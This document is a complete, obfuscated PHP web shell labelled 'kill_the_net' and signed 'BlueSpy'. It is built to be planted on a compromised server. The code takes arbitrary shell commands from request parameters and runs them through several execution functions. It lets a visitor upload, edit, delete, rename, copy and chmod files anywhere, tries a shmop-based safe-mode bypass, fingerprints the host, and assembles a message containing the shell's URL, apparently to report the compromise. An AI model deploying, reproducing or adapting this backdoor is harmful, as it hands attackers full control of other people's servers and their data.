<?php echo '<html>
<head>
<meta http-equiv="Content-Language" content="pt-br">
<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
<meta name="ProgId" content="AoD">
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title> kill_the_net </title>
<style type="text/css">
A:link {text-decoration:none}
A:visited {text-decoration:none}
A:hover {text-decoration:underline}
A:active {text-decoration:underline}
body,td {
	font-family: verdana;
	font-size: 8pt;
	background-color: #000;
}
a{
	color: #0000FF;
	text-decoration: none;
	font-weight: bold;
}
a:hover {
	color: #FF0000;
	text-decoration: underline;
}
body,td,th {
	font-weight: bold;
	color: #0f0;
}
</style>
</head>
<body text="#FFFFFF" >
<center><h2>0x666</h2></center>
<center>';
@set_time_limit(0);
$IIIIIIIIIIIl = $_SERVER['QUERY_STRING'];
$IIIIIIIIIII1 = 'shell?';
$IIIIIIIIIIlI = explode("$IIIIIIIIIII1", $IIIIIIIIIIIl);
$IIIIIIIIIIl1 = $IIIIIIIIIIlI[0];
$IIIIIIIIII1I = $_SERVER['PHP_SELF'] . "?" . $IIIIIIIIIIl1 . $IIIIIIIIIII1;
$IIIIIIIIII1l = @PHP_OS;
$IIIIIIIIII11 = '127.0.0.1';
$IIIIIIIIIlII = @php_uname();
$IIIIIIIIIlIl = @phpversion();
$IIIIIIIIIllI = @ini_get('safe_mode');
if ($IIIIIIIIIllI == '') {
    $IIIIIIIIIllI = "<i>OFF</i>";
} else {
    $IIIIIIIIIllI = "<i>$IIIIIIIIIllI</i>";
}
$IIIIIIIIIll1 = 'shell?';
echo "<script type=\"text/javascript\">";
echo "function ChMod(chdir, file) {";
echo "var o = prompt('Chmod: - Contoh: 0777', '');";
echo "if (o) {";
echo "window.location=\"\" + '{$IIIIIIIIII1I}&action=chmod&chdir=' + chdir + '&file=' + file + 

'&chmod=' + o + \"\";";
echo "}";
echo "}";
echo "function Rename(chdir, file, mode) {";
echo "if (mode == 'edit') {";
echo "var o = prompt('Rename Nama File '+ file + ' menjadi:', '');";
echo "}";
echo "else {";
echo "var o = prompt('Rename Nama Folder '+ file + ' menjadi:', '');";
echo "}";
echo "if (o) {";
echo "window.location=\"\" + '{$IIIIIIIIII1I}&action=rename&chdir=' + chdir + '&file=' + file + 

'&newname=' + o + '&mode=' + mode +\"\";";
echo "}";
echo "}";
echo "function Copy(chdir, file) {";
echo "var o = prompt('Copied for:', '/tmp/' + file);";
echo "if (o) {";
echo "window.location=\"\" + '{$IIIIIIIIII1I}&action=copy&chdir=' + chdir + '&file=' + file + 

'&fcopy=' + o + \"\";";
echo "}";
echo "}";
echo "function Mkdir(chdir) {";
echo "var o = prompt('Nama Folder?', 'Folder_Baru');";
echo "if (o) {";
echo "window.location=\"\" + '{$IIIIIIIIII1I}&action=mkdir&chdir=' + chdir + '&newdir=' + o + 

\"\";";
echo "}";
echo "}";
echo "function Newfile(chdir) {";
echo "var o = prompt('Nama File?', 'NewFile.txt');";
echo "if (o) {";
echo "window.location=\"\" + '{$IIIIIIIIII1I}&action=newfile&chdir=' + chdir + '&newfile=' + o + 

\"\";";
echo "}";
echo "}";
echo "</script>";
function cmd($IIIIIIIIIl1l) {
    $IIIIIIIIIl11[1] = '';
    exec($IIIIIIIIIl1l, $IIIIIIIIIl11[1]);
    if (empty($IIIIIIIIIl11[1])) {
        $IIIIIIIIIl11[1] = shell_exec($IIIIIIIIIl1l);
    } elseif (empty($IIIIIIIIIl11[1])) {
        $IIIIIIIIIl11[1] = passthru($IIIIIIIIIl1l);
    } elseif (empty($IIIIIIIIIl11[1])) {
        $IIIIIIIIIl11[1] = system($IIIIIIIIIl1l);
    } elseif (empty($IIIIIIIIIl11[1])) {
        $IIIIIIIII1ll = popen($IIIIIIIIIl1l, 'r');
        while (!feof($IIIIIIIII1ll)) {
            $IIIIIIIIIl11[1][].= fgets($IIIIIIIII1ll);
        }
        pclose($IIIIIIIII1ll);
    }
    return $IIIIIIIIIl11[1];
}
if (@$_GET['chdir']) {
    $chdir = $_GET['chdir'];
} else {
    $chdir = getcwd() . "/";
}
if (@chdir("$chdir")) {
    $IIIIIIIIlII1 = "<font color=\"#FFFFFF\"> Directory Door, OK!</font>";
} else {
    $IIIIIIIIlII1 = "<font color=\"#FF0000\">Error: Could not enter folder!</font>";
    $chdir = str_replace($SCRIPT_NAME, "", $_SERVER['SCRIPT_NAME']);
}
$chdir = str_replace(chr(92), chr(47), $chdir);
if (@$_GET['action'] == 'upload') {
    $IIIIIIIIlIll = $chdir;
    $IIIIIIIIlIl1 = $IIIIIIIIlIll . $_FILES['userfile']['name'];
    if (@move_uploaded_file($_FILES['userfile']['tmp_name'], $IIIIIIIIlIll . $_FILES['userfile']['name'])) {
        $IIIIIIIIlII1 = "<font color=\"#FFFFFF\"><font 

color=\"#FFFFFF\">{$_FILES['userfile']['name']}</font>, archieve valid, uploading complete. 

</font>";
    } else {
        $IIIIIIIIlII1 = "<font color=\"#FF0000\">Error: couldnt upload file on server.</font>";
    }
} elseif (@$_GET['action'] == 'mkdir') {
    $newdir = $_GET['newdir'];
    if (@mkdir("$chdir" . "$newdir")) {
        $IIIIIIIIlII1 = "<font color=\"#FFFFFF\"><font color=\"#FFFFFF\">{$newdir}</font>, folder 
Created. </font>";
    } else {
        $IIIIIIIIlII1 = "<font color=\"#FF0000\">Error: Folder Make Error.</font>";
    }
} elseif (@$_GET['action'] == 'newfile') {
    $newfile = $_GET['newfile'];
    if (@touch("$chdir" . "$newfile")) {
        $IIIIIIIIlII1 = "<font color=\"#FFFFFF\"><font color=\"#FFFFFF\">{$newfile}</font>, berhasil 

dibuat! ye ke? </font>";
    } else {
        $IIIIIIIIlII1 = "<font color=\"#FF0000\">Error: Pembuatan arsip gagal! entah?</font>";
    }
} elseif (@$_GET['action'] == 'del') {
    $file = $_GET['file'];
    $type = $_GET['type'];
    if ($type == 'file') {
        if (@unlink("$chdir" . "$file")) {
            $IIIIIIIIlII1 = "<font color=\"#FFFFFF\"><font color=\"#FFFFFF\">{$file}</font>, Berhasil 

menghapus arsip (file)!</font>";
        } else {
            $IIIIIIIIlII1 = "<font color=\"#FF0000\">Error: Gagal menghapus arsip (file)!</font>";
        }
    } elseif ($type == 'dir') {
        if (@rmdir("$chdir" . "$file")) {
            $IIIIIIIIlII1 = "<font color=\"#FFFFFF\"><font color=\"#FFFFFF\">{$file}</font>, Berhasil 

menghapus folder!</font>";
        } else {
            $IIIIIIIIlII1 = "<font color=\"#FF0000\">Error: Gagal menghapus folder!</font>";
        }
    }
} elseif (@$_GET['action'] == 'chmod') {
    $file = $chdir . $_GET['file'];
    $chmod = $_GET['chmod'];
    if (@chmod("$file", $chmod)) {
        $IIIIIIIIlII1 = "<font color=\"#FFFFFF\">Chmod dari</font> <font 

color=\"#FFFFFF\">{$_GET['file']}</font> <font color=\"#FFFFFF\">berubah menjadi</font> 

<font color=\"#FFFFFF\">$chmod</font> <font color=\"#FFFFFF\">: Sukses!</font>";
    } else {
        $IIIIIIIIlII1 = '<font color=\"#FF0000\">Error: Gagal mengubah chmod.</font>';
    }
} elseif (@$_GET['action'] == 'rename') {
    $file = $_GET['file'];
    $newname = $_GET['newname'];
    if (@rename("$chdir" . "$file", "$chdir" . "$newname")) {
        $IIIIIIIIlII1 = "<font color=\"#FFFFFF\">Archive</font> <font color=\"#FFFFFF\">{$file}</font> 

<font color=\"#FFFFFF\">named for</font> <font color=\"#FFFFFF\">{$newname}</font> <font 

color=\"#FFFFFF\">successfully!</font>";
    } else {
        $IIIIIIIIlII1 = "<font color=\"#FF0000\">Error: Gagal mencalonkan arsip.</font>";
    }
} elseif (@$_GET['action'] == 'copy') {
    $file = $chdir . $_GET['file'];
    $copy = $_GET['fcopy'];
    if (@copy("$file", "$copy")) {
        $IIIIIIIIlII1 = "<font color=\"#FFFFFF\">{$file}</font>, <font color=\"#FFFFFF\">disalin 

menjadi</font> <font color=\"#FFFFFF\">{$copy}</font> <font color=\"#FFFFFF\"> 

Berhasil!</font>";
    } else {
        $IIIIIIIIlII1 = "<font color=\"#FF0000\">Error: Gagal menyalin </font> <font 

color=\"#FFFFFF\">{$file}</font> <font color=\"#FF0000\">menjadi</font> <font 

color=\"#FFFFFF\">{$copy}</font></font>";
    }
} elseif (@$_GET['action'] == 'cmd') {
    if (!empty($_GET['cmd'])) {
        $cmd = @$_GET['cmd'];
    }
    if (!empty($_POST['cmd'])) {
        $cmd = @$_POST['cmd'];
    }
    $cmd = stripslashes(trim($cmd));
    $IIIIIIIIl1ll = cmd($cmd);
    $IIIIIIIIl1l1 = count($IIIIIIIIl1ll);
    $IIIIIIIIl11l = 0;
    $IIIIIIIIlII1 = '';
    $IIIIIIIIlII1.= "<p style=\"color: #FFFFFF;text-align: center;font-family: 'Lucida 

Console';font-size: 12px;margin 2\">Hasil : <b>" . $cmd . "</b></p>";
    if ($IIIIIIIIl1ll) {
        while ($IIIIIIIIl11l <= $IIIIIIIIl1l1) {
            $IIIIIIIIlII1.= "<p style=\"color: #FFFFFF;text-align: left;font-family: 

'Lucida Console';font-size: 12px;margin 2\"> " . @$IIIIIIIIl1ll[$IIIIIIIIl11l] . "</p>";
            $IIIIIIIIl11l++;
        }
    } else {
        $IIIIIIIIlII1.= "<p style=\"color: #FF0000;text-align: center;font-family: 'Lucida 

Console';font-size: 12px;margin 2\">Error: comando nao aceito.</p>";
    }
} elseif (@$_GET['action'] == 'safemode') {
    if (@!extension_loaded('shmop')) {
        echo "Loading... module</br>";
        if (strtoupper(substr(PHP_OS, 0, 3) == 'WIN')) {
            @dl('php_shmop.dll');
        } else {
            @dl('shmop.so');
        }
    }
    if (@extension_loaded('shmop')) {
        echo "Module: <b>shmop</b> loaded!</br>";
        $IIIIIIII1II1 = @shmop_open(0xff2, "c", 0644, 100);
        if (!$IIIIIIII1II1) {
            echo "Couldn't create shared memory segment
";
        }
        $IIIIIIII1IlI = "";
        $IIIIIIII1Ill = - 3842685;
        $IIIIIIII1Il1 = @shmop_write($IIIIIIII1II1, $IIIIIIII1IlI, $IIIIIIII1Ill);
        if ($IIIIIIII1Il1 != strlen($IIIIIIII1IlI)) {
            echo "Couldn't write the entire length of 

data
";
        }
        if (!shmop_delete($IIIIIIII1II1)) {
            echo "Couldn't mark shared memory block for deletion.";
        }
        echo passthru("id");
        shmop_close($IIIIIIII1II1);
    } else {
        echo "Module: <b>shmop</b> tidak dimuat!</br>";
    }
} elseif (@$_GET['action'] == 'zipen') {
    $file = $_GET['file'];
    $IIIIIIII1I11 = @zip_open("$chdir" . "$file");
    $IIIIIIIIlII1 = '';
    if ($IIIIIIII1I11) {
        while ($IIIIIIII1lIl = zip_read($IIIIIIII1I11)) {
            $IIIIIIIIlII1.= "Name:               " . zip_entry_name($IIIIIIII1lIl) . "
";
            $IIIIIIIIlII1.= "Actual Filesize:    " . zip_entry_filesize($IIIIIIII1lIl) . "
";
            $IIIIIIIIlII1.= "Compressed Size:    " . zip_entry_compressedsize($IIIIIIII1lIl) . "
";
            $IIIIIIIIlII1.= "Compression Method: " . zip_entry_compressionmethod($IIIIIIII1lIl) . "
";
            if (zip_entry_open($IIIIIIII1I11, $IIIIIIII1lIl, "r")) {
                echo "File Contents:
";
                $IIIIIIII1l11 = zip_entry_read($IIIIIIII1lIl, zip_entry_filesize($IIIIIIII1lIl));
                echo "$IIIIIIII1l11
";
                zip_entry_close($IIIIIIII1lIl);
            }
            echo "
";
        }
        zip_close($IIIIIIII1I11);
    }
} elseif (@$_GET['action'] == 'edit') {
    $file = $_GET['file'];
    $IIIIIIII11lI = '';
    $IIIIIIII11ll = "$chdir" . "$file";
    $IIIIIIII11lI = @file_get_contents($IIIIIIII11ll);
    $IIIIIIII11lI = htmlspecialchars($IIIIIIII11lI);
    $IIIIIIII111I = $_SERVER['HTTP_REFERER'];
    echo "<p align=\"center\">Editing {$file} ...</p>";
    echo "<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: 

collapse\" width=\"100%\" id=\"editacao\">";
    echo "<tr>";
    echo "<td width=\"100%\">";
    echo "<form method=\"POST\" 

action=\"{$IIIIIIIIII1I}&amp;action=save&amp;chdir={$chdir}&amp;file={$file}\">";
    echo "<!--webbot bot=\"SaveResults\" u-file=\"_private/form_results.csv\" 

s-format=\"TEXT/CSV\" s-label-fields=\"TRUE\" --><p align=\"center\">";
    print "<textarea rows=\"18\" name=\"S1\" cols=\"89\" style=\"font-family: Verdana; 

font-size: 8pt; border: 1px solid #FFFFFF\">{$IIIIIIII11lI}</textarea></p>";
    echo "<p align=\"center\">";
    echo "<input type=\"submit\" value=\"Simpan\" name=\"B2\" style=\"  border: 1px solid 

#FFFFFF\"> ";
    echo "<input type=\"button\" value=\"Tutup\" 

Onclick=\"javascript:window.location='{$IIIIIIIIII1I}&amp;chdir={$chdir}'\" name=\"B1\" style=\"  

border: 1px solid #FFFFFF\"> ";
    echo "</form>";
    echo "</td>";
    echo "</tr>";
    echo "</table>";
} elseif (@$_GET['action'] == 'save') {
    $IIIIIIII11ll = "$chdir" . $_GET['file'];
    $IIIIIIII111l = $_POST['S1'];
    $IIIIIIII111l = stripslashes(trim($IIIIIIII111l));
    if (is_writable($IIIIIIII11ll)) {
        @$IIIIIIIII1ll = fopen($IIIIIIII11ll, "w");
        @$IIIIIIIlIIIl = fwrite($IIIIIIIII1ll, $IIIIIIII111l);
        @fclose($IIIIIIIII1ll);
        if ($IIIIIIIII1ll && $IIIIIIIlIIIl) {
            $IIIIIIIIlII1 = "<font color=\"#FFFFFF\">{$_GET['file']}</font>, <font 

color=\"#FFFFFF\">berhasil diedit!</font>";
        }
    } else {
        $IIIIIIIIlII1 = "<font color=\"#FFFFFF\">{$_GET['file']},</font> <font color=\"#FF0000\">tidak 

bisa ditulisi!</font>";
    }
}
$IIIIIIIlIIll = '';
if (!empty($_GET['cmd'])) {
    $IIIIIIIlIIll = @$_GET['cmd'];
}
if (!empty($_POST['cmd'])) {
    $IIIIIIIlIIll = @$_POST['cmd'];
}
$IIIIIIIlIIll = htmlspecialchars($IIIIIIIlIIll);
function IIIIIIIlIIl1() {
    $IIIIIIIlII1I = '';
    if (@file_exists("/usr/bin/wget")) {
        $IIIIIIIlII1I.= "wget ";
    }
    if (@file_exists("/usr/bin/fetch")) {
        $IIIIIIIlII1I.= "fetch ";
    }
    if (@file_exists("/usr/bin/curl")) {
        $IIIIIIIlII1I.= "curl ";
    }
    if (@file_exists("/usr/bin/GET")) {
        $IIIIIIIlII1I.= "GET ";
    }
    if (@file_exists("/usr/bin/lynx")) {
        $IIIIIIIlII1I.= "lynx ";
    }
    return $IIIIIIIlII1I;
}
echo "<form method=\"POST\" name=\"cmd\" 

action=\"{$IIIIIIIIII1I}&amp;action=cmd&amp;chdir=$chdir\">";
echo "<fieldset style=\"border: 1px solid #FFFFFF; padding: 2\">";
echo "<legend style='color:#0F0'>INFO</legend>";
echo "<br><table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: 

collapse; font-family: Verdana; font-size: 10px\" width=\"100%\">";
echo "<tr>";
echo "<td width=\"8%\">";
echo " <b>SYSTEM </b> </td> ";
echo "<td width=\"92%\">: {$IIIIIIIIII1l}</td>";
echo "</tr>";
echo "<tr>";
echo "<td width=\"8%\">";
echo " <b>NAME </b></td> ";
echo "<td width=\"92%\">: {$IIIIIIIIIlII}</td>";
echo "</tr>";
echo "<tr>";
echo "<td width=\"8%\">";
echo " <b>PHP </b></td> ";
echo "<td width=\"92%\">: {$IIIIIIIIIlIl}, <b> Safe Mode :</b> {$IIIIIIIIIllI}</td>";
echo "</tr>";
if (strtoupper(substr($IIIIIIIIII1l, 0, 3) != 'WIN')) {
    $IIIIIIIlII1l = IIIIIIIlIIl1();
    if ($IIIIIIIlII1l == '') {
        $IIIIIIIlII1l = "???";
    }
    echo "<tr>";
    echo "<td width=\"8%\">";
    echo "<b>Methods </b></td> ";
    echo "<td width=\"92%\">: {$IIIIIIIlII1l}</td>";
    echo "</tr>";
}
echo "<tr>";
echo "<td width=\"8%\">";
echo " <b>IP </b></td> ";
echo "<td width=\"92%\">: {$IIIIIIIIII11}</td>";
echo "</tr>";
echo "<tr>";
echo "<td width=\"8%\">";
echo " <b>Command </b></td> ";
echo "<td width=\"92%\">: <input type=\"text\" size=\"70\" name=\"cmd\" value=\"{$IIIIIIIlIIll}\" 

style=\" font-size: 8 pt; border: 1px solid #FFFFFF\"> <input type=\"submit\" 

name=\"action\" value=\"CMD\" style=\" font-size: 8 pt; border: 1px solid 

#FFFFFF\"></td>";
echo "</tr>";
echo "</table><br>";
echo "</fieldset></form>";
echo "<form method=\"POST\" action=\"{$IIIIIIIIII1I}&amp;action=upload&amp;chdir=$chdir\" 

enctype=\"multipart/form-data\">";
echo "<!--webbot bot=\"FileUpload\" u-file=\"_private/form_results.csv\" 

s-format=\"TEXT/CSV\" s-label-fields=\"TRUE\" --><fieldset style=\"border: 1px solid 

#FFFFFF; padding: 2\">";
if (is_writable("$chdir")) {
    if (strtoupper(substr($IIIIIIIIII1l, 0, 3) == 'WIN')) {
        echo "<legend style='color:#0F0'>Dir <b>YES</b>: {$chdir} - <a href=\"#[New Dir]\" 

onclick=\"Mkdir('{$chdir}');\">NEW DIR</a> | <a href=\"#[New File]\" 

onclick=\"Newfile('{$chdir}')\">NEW FILE</a> | <a 

href=\"{$IIIIIIIIII1I}&amp;action=cmd&amp;chdir={$chdir}&amp;cmd=$IIIIIIIlII11\">REMOTO</a></legend>";
    } else {
        echo "<legend>Dir <b>YES</b>: {$chdir} - <a href=\"#[New Dir]\" 

onclick=\"Mkdir('{$chdir}');\">NEW DIR</a> | <a href=\"#[New File]\" 

onclick=\"Newfile('{$chdir}')\">NEW FILE</a> | <a 

href=\"{$IIIIIIIIII1I}&amp;action=backtool&amp;chdir={$chdir}&amp;write=yes\">Kembali</a></legend

>";
    }
} else {
    if (strtoupper(substr($IIIIIIIIII1l, 0, 3) == 'WIN')) {
        echo "<legend>Dir NO: {$chdir} - <a href=\"#[New Dir]\" 

onclick=\"Mkdir('{$chdir}');\">CRIAR DIRETORIO</a> | <a href=\"#[New File]\" 

onclick=\"Newfile('{$chdir}')\">CRIAR ARQUIVO</a> | <a 

href=\"{$IIIIIIIIII1I}&amp;action=cmd&amp;chdir={$chdir}&amp;cmd={$IIIIIIIlII11}\">REMOTO</a></legend>";
    } else {
        echo "<legend>Dir NO: {$chdir} - <a href=\"#[New Dir]\" 

onclick=\"Mkdir('{$chdir}');\">Folder Baru</a> | <a href=\"#[New File]\" 

onclick=\"Newfile('{$chdir}')\">CRIAR ARQUIVO</a> | <a 

href=\"{$IIIIIIIIII1I}&amp;action=backtool&amp;chdir={$chdir}&amp;write=no\">Kembali</a></legend>

";
    }
}
if (@!$IIIIIIIII1ll = opendir("$chdir")) {
    echo " Gue gak bisa masuk folder, <a href=\"{$IIIIIIIIII1I}\">Klik sini!</a> untuk embali ke 

folder ori!</br>";
} else {
    echo "  <table border=\"0\" cellpadding=\"5\" cellspacing=\"0\" width=\"100%\">";
    echo "    <tr>";
    echo "      <td width=\"100%\" colspan=\"4\"> Upload:";
    echo "      <input type=\"file\" name=\"userfile\" size=\"65\" style=\"  border-style: 

solid; border-width: 1\">";
    echo "      <input type=\"submit\" value=\"UP\" name=\"B1\" style=\" border: 1px solid 

#FFFFFF\"></td>";
    echo "    </tr>";
    echo "    <tr>";
    echo "      <td width=\"100%\" colspan=\"4\"> </td>";
    echo "    </tr>";
    echo "    <tr>";
    echo "      <td width=\"100%\" colspan=\"4\">";
    if (@!$IIIIIIIIlII1) {
        echo "      <p align=\"left\">Messages</td>";
    } else {
        echo "      <p align=\"left\">$IIIIIIIIlII1</td>";
    }
    echo "    </tr>";
    echo "    <tr>";
    echo "      <td width=\"100%\" colspan=\"4\"> </td>";
    echo "    </tr></table> ";
    echo "   <table border=\"1\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\">";
    echo "    <tr bgcolor=\"#000\" align=\"center\"> ";
    echo "      <td > Permision</td>";
    echo "      <td > Nama File </td>";
    echo "      <td > Kapasitas </td>";
    echo "      <td > Command</td>";
    echo "     </tr>";
    $IIIIIIIlIlIl = 0;
    while (false !== ($file = readdir($IIIIIIIII1ll))) {
        if ($file != '.') {
            if ($IIIIIIIlIlIl == 0) {
                $IIIIIIIlIllI = "style=\"background-color: #000\"";
            } elseif ($IIIIIIIlIlIl == 1) {
                $IIIIIIIlIllI = "style=\"background-color:  #000\"";
            }
            if (@is_dir("$chdir" . "$file")) {
                $file = $file . '/';
                $IIIIIIIlIll1 = 'chdir';
            } else {
                $IIIIIIIlIll1 = 'edit';
            }
            if (@substr("$chdir", strlen($chdir) - 1, 1) != '/') {
                $chdir.= '/';
            }
            if ($file == '../') {
                $IIIIIIIlIl1I = strlen($chdir);
                $IIIIIIIlIl1l = 0;
                for ($IIIIIIIlIl11 = 0;$IIIIIIIlIl11 < $IIIIIIIlIl1I;$IIIIIIIlIl11++) {
                    if ($chdir{$IIIIIIIlIl11} == '/') {
                        $IIIIIIIlIl1l++;
                    }
                }
                $IIIIIIIlI1II = explode("/", $chdir);
                $IIIIIIIlI1Il = str_replace($IIIIIIIlI1II[$IIIIIIIlIl1l - 1] . '/', "", $chdir);
            }
            $IIIIIIIlI1I1 = @fileperms("$chdir" . "$file");
            if ($IIIIIIIlI1I1 == '') {
                $IIIIIIIlI1I1 = '???';
            }
            $IIIIIIIlI1ll = @filesize("$chdir" . "$file");
            $IIIIIIIlI1ll = $IIIIIIIlI1ll / 1024;
            $IIIIIIIlI1ll = explode(".", $IIIIIIIlI1ll);
            if (@$IIIIIIIlI1ll[1] != '') {
                $IIIIIIIlI1ll = $IIIIIIIlI1ll[0] . '.' . @substr("$IIIIIIIlI1ll[1]", 0, 2);
            } else {
                $IIIIIIIlI1ll = $IIIIIIIlI1ll[0];
            }
            if ($IIIIIIIlI1ll == 0) {
                if ($IIIIIIIlIll1 == 'chdir') {
                    $IIIIIIIlI1ll = '???';
                }
            }
            echo "<tr>";
            echo "<td align=\"center\" $IIIIIIIlIllI> $IIIIIIIlI1I1</td>";
            if (@is_writable("$chdir" . "$file")) {
                if ($IIIIIIIlIll1 == 'chdir') {
                    if ($file == '../') {
                        echo "<td $IIIIIIIlIllI> <b><a href=\"{$IIIIIIIIII1I}&amp;chdir=$IIIIIIIlI1Il\"><font 

color=\"#FFFFFF\">$file</font></a></b> </td>";
                    } else {
                        echo "<td $IIIIIIIlIllI> <b><a href=\"{$IIIIIIIIII1I}&amp;chdir={$chdir}{$file}\"><font 

color=\"#FFFFFF\">$file</font></a> </b></td>";
                    }
                } else {
                    if (is_readable("$chdir" . "$file")) {
                        echo "<td $IIIIIIIlIllI> <a 

href=\"{$IIIIIIIIII1I}&amp;action=edit&amp;chdir=$chdir&amp;file=$file\">$file</a> </td>";
                    } else {
                        echo "<td $IIIIIIIlIllI> $file </td>";
                    }
                }
            } else {
                if ($IIIIIIIlIll1 == 'chdir') {
                    if ($file == '../') {
                        echo "<td $IIIIIIIlIllI> <a href=\"{$IIIIIIIIII1I}&amp;chdir=$IIIIIIIlI1Il\">$file</a> 

</td>";
                    } else {
                        echo "<td $IIIIIIIlIllI> <a 

href=\"{$IIIIIIIIII1I}&amp;chdir={$chdir}{$file}\">$file</a></td>";
                    }
                } else {
                    if (@is_readable("$chdir" . "$file")) {
                        echo "<td  $IIIIIIIlIllI> <a 

href=\"{$IIIIIIIIII1I}&amp;action=edit&amp;chdir=$chdir&amp;file=$file\">$file</a> </td>";
                    } else {
                        echo "<td $IIIIIIIlIllI> $file</td>";
                    }
                }
            }
            echo "<td align=\"right\" $IIIIIIIlIllI> $IIIIIIIlI1ll KB</td>";
            if ($IIIIIIIlIll1 == 'edit') {
                echo "<td align=\"center\" $IIIIIIIlIllI> <a href=\"#{$file}\" 

onclick=\"Rename('{$chdir}', '{$file}', '{$IIIIIIIlIll1}')\">Rename</a> | <a 

href=\"{$IIIIIIIIII1I}&amp;action=del&amp;chdir={$chdir}&amp;file={$file}&amp;type=file\">Del</a> 

| <a href=\"#{$file}\" onclick=\"ChMod('$chdir', '$file')\">Chmod</a> | <a href=\"#{$file}\" 

onclick=\"Copy('{$chdir}', '{$file}')\">Copy</a> </td>";
            } else {
                echo "<td align=\"center\" $IIIIIIIlIllI> <a href=\"#{$file}\" 

onclick=\"Rename('{$chdir}', '{$file}', '{$IIIIIIIlIll1}')\">Rename</a> | <a 

href=\"{$IIIIIIIIII1I}&amp;action=del&amp;chdir={$chdir}&amp;file={$file}&amp;type=dir\">Del</a> 

| <a href=\"#{$file}\" onclick=\"ChMod('$chdir', '$file')\">Chmod</a> | Copy </td>";
            }
            echo "</tr>";
            if ($IIIIIIIlIlIl == 3) {
                $IIIIIIIlIlIl = 2;
            } elseif ($IIIIIIIlIlIl == 2) {
                $IIIIIIIlIlIl = 3;
            }
        }
    }
    closedir($IIIIIIIII1ll);
}
$IIIIIIIIII1l = @PHP_OS;
$IIIIIIIIIlII = @php_uname();
$IIIIIIIIIlIl = @phpversion();
$IIIIIIIIIllI = @ini_get('safe_mode');
if ($IIIIIIIIIllI == '') {
    $IIIIIIIIIllI = "<i>OFF</i><BR>";
} else {
    $IIIIIIIIIllI = "<i>$IIIIIIIIIllI</i><BR>";
}
$IIIIIIIlI111 = ($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
$IIIIIIIllIII = ("OS = " . $IIIIIIIIII1l . "<BR>UNAME = " . $IIIIIIIIIlII . "<BR>PHPVersion = " . $IIIIIIIIIlIl . "<BR>Safe Mode = " . $IIIIIIIIIllI . "<BR><font color=blue>http://" . $IIIIIIIlI111 . "</font><BR>Ingat jangan pakai Injek Ini.<BR>By: BlueSpy");
$IIIIIIIllIIl = "From: $_SERVER[HTTP_HOST] <$IIIIIIIllII1>
Reply-To: $IIIIIIIllIlI
";
$IIIIIIIllIIl.= "MIME-Version: 1.0
";
If ($IIIIIIIllIll) $IIIIIIIllIIl.= "Content-Type: multipart/mixed; boundary=$IIIIIIIllIl1
";
If ($IIIIIIIllIll) $IIIIIIIllIIl.= "--$IIIIIIIllIl1
";
$IIIIIIIllIIl.= "Content-Type: text/$IIIIIIIllI1I
";
$IIIIIIIllIIl.= "Content-Transfer-Encoding: 8bit

";
$IIIIIIIllIIl.= "$IIIIIIIllI1l
";
If ($IIIIIIIllIll) $IIIIIIIllIIl.= "--$IIIIIIIllIl1
";
If ($IIIIIIIllIll) $IIIIIIIllIIl.= "Content-Type: $IIIIIIIllI11; name=\"$IIIIIIIllIll\"
";
If ($IIIIIIIllIll) $IIIIIIIllIIl.= "Content-Transfer-Encoding: base64
";
If ($IIIIIIIllIll) $IIIIIIIllIIl.= "Content-Disposition: attachment; 

filename=\"$IIIIIIIllIll\"

";
If ($IIIIIIIllIll) $IIIIIIIllIIl.= "$IIIIIIIlllII
";
If ($IIIIIIIllIll) $IIIIIIIllIIl.= "--$IIIIIIIllIl1--";;
$IIIIIIIlllI1 = ("injekan anyar Bos");
@include "$IIIIIIIIIll1";;
echo '  </table>
  </fieldset></form>
</div></center>
</body>

</html>
';;
